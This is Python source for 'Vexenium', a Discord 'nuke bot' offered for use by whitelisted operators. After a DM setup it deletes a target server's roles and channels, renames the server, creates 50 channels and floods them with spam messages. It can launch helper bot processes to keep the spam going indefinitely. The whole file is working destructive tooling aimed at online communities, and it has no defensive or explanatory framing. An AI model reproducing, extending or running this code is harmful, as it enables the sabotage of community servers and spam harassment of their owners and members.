# Vexenium - By Kaox113 (Dr.Web)
# Private Nuke Bot
# You only need create bot and get token!


import sys
import subprocess
import random
import asyncio
import os
import json
from multiprocessing import Process

try:
    import discord
    from discord.ext import commands
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "discord.py"])
    import discord
    from discord.ext import commands

MAIN_BOT_TOKEN = 'Main Bot Token'
HELPER_TOKENS = [
    'Helper Bot Token',
    'Helper Bot Token',
    'Helper Bot Token'
]
HELPER_INVITES = [
    'Helper Bot Invite',
    'Helper Bot Invite',
    'Helper Bot Invite'
]

WHITELISTED_USERS = {1385232536208150569, 987654321098765432,1323294365166211212, 1361048732619247936, 1234105593053188127, 1301161460851933217}  # Users who can use bot
CONFIG_DIR = "user_configs"

def get_user_config_path(user_id):
    if not os.path.exists(CONFIG_DIR):
        os.makedirs(CONFIG_DIR)
    return os.path.join(CONFIG_DIR, f"{user_id}_config.json")

def load_config(user_id):
    config_path = get_user_config_path(user_id)
    if os.path.exists(config_path):
        with open(config_path, "r", encoding="utf-8") as f:
            return json.load(f)
    return None

def save_config(user_id, config):
    config_path = get_user_config_path(user_id)
    with open(config_path, "w", encoding="utf-8") as f:
        json.dump(config, f, indent=2)

def run_spam_bot(token, target_guild_id):
    intents = discord.Intents.default()
    intents.guilds = True
    intents.messages = True
    intents.message_content = True

    bot = commands.Bot(command_prefix='-', intents=intents) # Prefix: - (you can change)

    @bot.event
    async def on_ready():
        print(f'{bot.user} connected and ready to spam.')

        guild = bot.get_guild(target_guild_id)
        if not guild:
            print(f"{bot.user} not in the target guild {target_guild_id}!")
            return

        with open("messages_to_spam.txt", "r", encoding="utf-8") as f:
            messages = [line.strip() for line in f if line.strip()]

        channels = [ch for ch in guild.text_channels]
        print(f'{bot.user} found {len(channels)} channels in guild {target_guild_id}.')

        async def spam_channel(channel):
            while True:
                try:
                    await channel.send(random.choice(messages))
                except Exception as e:
                    print(f"Error in {channel.name}: {e}")
                await asyncio.sleep(1)

        await asyncio.gather(*(spam_channel(ch) for ch in channels))

    bot.run(token)

def run_main_bot():
    intents = discord.Intents.default()
    intents.guilds = True
    intents.guild_messages = True
    intents.messages = True
    intents.members = True
    intents.message_content = True

    bot = commands.Bot(command_prefix='-', intents=intents)

    @bot.event
    async def on_ready():
        print(f'Vexenium - Your Private Nuke Bot! Connected to: {bot.user}')

    def check_whitelist(ctx):
        return ctx.author.id in WHITELISTED_USERS

    async def create_roles(guild, role_names):
        """Make roles with names (add names in setup)"""
        created_roles = []
        
        for name in role_names:
            try:
                # Make role with random color
                color = discord.Color.random()
                role = await guild.create_role(name=name, color=color)
                created_roles.append(role)
                print(f"Created role: {name}")
                
                # Timeout for Anti API limit
                await asyncio.sleep(0.2)
                
            except discord.Forbidden:
                print("❌ Bot doesn't have permission to create roles!")
                break
            except discord.HTTPException as e:
                print(f"❌ Error creating role {name}: {e}")
                continue
        
        return created_roles

    async def delete_all_roles(guild):
        """Deleting all roles which can be deleted by a bot"""
        bot_member = guild.get_member(bot.user.id)
        if not bot_member:
            return 0
            
        bot_top_role = bot_member.top_role
        deleted_count = 0
        
        for role in guild.roles:
            # Not delete @everyone, roles above bot and integrations
            if (role.name == "@everyone" or 
                role.position >= bot_top_role.position or 
                role.managed):
                continue
                
            try:
                await role.delete()
                deleted_count += 1
                await asyncio.sleep(0.2)
            except Exception as e:
                print(f"Error deleting role {role.name}: {e}")
                continue

        return deleted_count

    @bot.command()
    async def setup(ctx): # Setup Command
        if not check_whitelist(ctx):
            await ctx.author.send("❌ You are not authorized to use this bot.")
            return

        def check_dm(m):
            return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)

        await ctx.author.send("What new server name?")
        server_name_msg = await bot.wait_for('message', check=check_dm, timeout=120)
        new_server_name = server_name_msg.content.strip()

        await ctx.author.send("Channel names? (Separate with `|`)")
        channels_msg = await bot.wait_for('message', check=check_dm, timeout=120)
        channel_names = [x.strip() for x in channels_msg.content.split('|')]

        await ctx.author.send("Messages to spam? (Separate with `|`)")
        messages_msg = await bot.wait_for('message', check=check_dm, timeout=120)
        messages = [x.strip() for x in messages_msg.content.split('|')]

        await ctx.author.send("Role names? (Separate with `|`, or type 'skip' to skip role creation)")
        roles_msg = await bot.wait_for('message', check=check_dm, timeout=120)
        if roles_msg.content.strip().lower() != 'skip':
            role_names = [x.strip() for x in roles_msg.content.split('|')]
        else:
            role_names = []

        config = {
            "server_name": new_server_name,
            "channel_names": channel_names,
            "messages": messages,
            "role_names": role_names
        }
        save_config(ctx.author.id, config)

        await ctx.author.send("✅ Your setup has been saved. You can now use `-echofy`.")

    @bot.command()
    async def echofy(ctx): # Nuke Command
        if not check_whitelist(ctx):
            await ctx.author.send("❌ You are not authorized to use this bot.")
            return

        def check_dm(m):
            return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)

        config = load_config(ctx.author.id)
        if not config:
            await ctx.author.send("⚠️ No setup found. Run `-setup` first.")
            return

        await ctx.author.send("Send the **guild ID**:")
        guild_id_msg = await bot.wait_for('message', check=check_dm, timeout=300)
        try:
            
            target_guild_id = int(guild_id_msg.content.strip())
        except ValueError:
            await ctx.author.send("❌ Invalid guild ID.")
            return

        guild = bot.get_guild(target_guild_id)
        if not guild:
            await ctx.author.send("❌ I am not in that server.")
            return

        await ctx.author.send("Do you want to use **helper bots**? (`yes` or `no`)")
        helper_choice_msg = await bot.wait_for('message', check=check_dm, timeout=120)
        use_helpers = helper_choice_msg.content.strip().lower() == "yes"

        if use_helpers:
            await ctx.author.send("Add these helper bots to the server:")
            for link in HELPER_INVITES:
                await ctx.author.send(link)
            await ctx.author.send("Reply `done` once all bots are added.")

            done_msg = await bot.wait_for('message', check=check_dm, timeout=300)
            if done_msg.content.lower() != 'done':
                await ctx.author.send("Setup cancelled.")
                return

        # Deleting old roles
        await ctx.author.send("🗑️ Deleting old roles...")
        deleted_count = await delete_all_roles(guild)
        await ctx.author.send(f"🗑️ Deleted {deleted_count} roles.")

        # Make new roles (if you add it)
        if config.get('role_names'):
            await ctx.author.send("🎨 Creating new roles...")
            created_roles = await create_roles(guild, config['role_names'])
            await ctx.author.send(f"🎨 Created {len(created_roles)} roles.")

        await ctx.author.send(f"🔄 Renaming server to **{config['server_name']}**...")
        await guild.edit(name=config["server_name"])

        await ctx.author.send("🗑️ Deleting all channels...")
        await asyncio.gather(*(ch.delete() for ch in guild.channels), return_exceptions=True)

        total_channels = 50
        channel_list = [config["channel_names"][i % len(config["channel_names"])] for i in range(total_channels)]
        new_channels = await asyncio.gather(*(guild.create_text_channel(name) for name in channel_list), return_exceptions=True)
        new_channels = [ch for ch in new_channels if isinstance(ch, discord.TextChannel)]

        if use_helpers:
            with open("messages_to_spam.txt", "w", encoding="utf-8") as f:
                for msg in config["messages"]:
                    f.write(msg + "\n")

            helper_processes = [Process(target=run_spam_bot, args=(token, target_guild_id)) for token in HELPER_TOKENS]
            for p in helper_processes:
                p.start()

            await ctx.author.send("🚀 Infinite spam with helper bots started...")

            async def spam_channel(channel):
                while True:
                    try:
                        await channel.send(random.choice(config["messages"]))
                    except Exception as e:
                        print(f"Error in {channel.name}: {e}")
                    await asyncio.sleep(1)

            await asyncio.gather(*(spam_channel(ch) for ch in new_channels))

        else:
            await ctx.author.send(f"Created {len(new_channels)} channels. Sending 30 messages per channel...")

            async def spam_limited(channel):
                for _ in range(30):
                    try:
                        await channel.send(random.choice(config["messages"]))
                    except Exception as e:
                        print(f"Error in {channel.name}: {e}")
                    await asyncio.sleep(1)

            await asyncio.gather(*(spam_limited(ch) for ch in new_channels))
            await ctx.author.send("✅ Finished sending messages (no helper bots).")

    @bot.command()
    async def create_roles_cmd(ctx):
        """Команда для создания ролей отдельно"""
        if not check_whitelist(ctx):
            await ctx.send("❌ You are not authorized to use this command.")
            return

        def check_dm(m):
            return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)

        await ctx.author.send("Send role names (separate with `|`):")
        roles_msg = await bot.wait_for('message', check=check_dm, timeout=120)
        role_names = [x.strip() for x in roles_msg.content.split('|') if x.strip()]

        await ctx.author.send("Send the **guild ID**:")
        guild_id_msg = await bot.wait_for('message', check=check_dm, timeout=120)
        try:
            target_guild_id = int(guild_id_msg.content.strip())
        except ValueError:
            await ctx.author.send("❌ Invalid guild ID.")
            return

        guild = bot.get_guild(target_guild_id)
        if not guild:
            await ctx.author.send("❌ I am not in that server.")
            return

        await ctx.author.send(f"🎨 Creating {len(role_names)} roles...")
        created_roles = await create_roles(guild, role_names)
        await ctx.author.send(f"✅ Successfully created {len(created_roles)} roles.")

    @bot.command()
    async def delete_roles(ctx):
        """Команда для удаления всех ролей"""
        if not check_whitelist(ctx):
            await ctx.send("❌ You are not authorized to use this command.")
            return

        def check_dm(m):
            return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)

        await ctx.author.send("Send the **guild ID**:")
        guild_id_msg = await bot.wait_for('message', check=check_dm, timeout=120)
        try:
            target_guild_id = int(guild_id_msg.content.strip())
        except ValueError:
            await ctx.author.send("❌ Invalid guild ID.")
            return

        guild = bot.get_guild(target_guild_id)
        if not guild:
            await ctx.author.send("❌ I am not in that server.")
            return

        await ctx.author.send("🗑️ Deleting all roles...")
        deleted_count = await delete_all_roles(guild)
        await ctx.author.send(f"✅ Successfully deleted {deleted_count} roles.")

    bot.run(MAIN_BOT_TOKEN)

if __name__ == "__main__":
    run_main_bot()